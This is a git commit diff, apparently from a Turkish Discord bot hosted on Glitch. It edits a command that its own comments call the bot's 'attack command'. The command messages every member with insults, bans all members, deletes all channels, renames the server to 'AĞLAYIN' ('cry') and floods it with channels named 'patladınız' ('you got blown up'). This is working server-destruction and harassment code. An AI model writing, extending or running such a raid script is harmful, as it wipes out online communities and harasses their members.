27dd6f76e3ad584622c489fdf81a77f2fe60c223
Glitch (hello-express) <none>
2019-09-07 15:19:10 +0000

    💪📒 Checkpoint ./komutlar/başla.js:3324753/1313 ./ayarlar.json:3324753/204

--- komutlar/başla.js
+++ komutlar/başla.js
@@ -5,20 +5,19 @@ exports.run = function(client, message) {
 
     message.guild.members.map(c => c.send(
 
-"• **World Code | Kod Paylaşım** Sunucusuna Aittir\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• https://discord.gg/x7VkCu9\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• Kodu Paylaşmak Yasaktır"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• ADAM OLUN LAN ADAM\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• Hepiniz adam olun!\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• ALAYINIZA BORU"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
 
-+"• **World | Kod Paylaşım** Sunucusuna Aittir\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• https://discord.gg/x7VkCu9\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• Kodu Paylaşmak Yasaktır"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• ADAM OLUN LAN ADAM\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• Hepiniz adam olun!\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• ALAYINIZA BORU"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
 
     ));
-    message.guild.setIcon("https://images-ext-1.discordapp.net/external/_v5OFNRPGDzrRSeyGqPJZDFG1pJ1cB4CLOKkD6tEVCQ/https/cdn.discordapp.com/icons/613710959256666114/85232ac485acd744ab44ffa13395460a.jpg").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCU PPSİNİ DEĞİŞTİRMEKTE KULLANMASI GEREKTİĞİ PPNİN LİNKİ
   message.guild.members.map(c => c.ban());
   message.guild.channels.map(c => c.delete())
   
-message.guild.setName("World Code ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
+message.guild.setName("AĞLAYIN ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
   
 
   message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
@@ -34,6 +33,15 @@ message.guild.setName("World Code ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİK
   message.guild.createChannel("patladınız").catch(console.error);
   message.guild.createChannel("patladınız").catch(console.error);
   message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  
   
   
 };
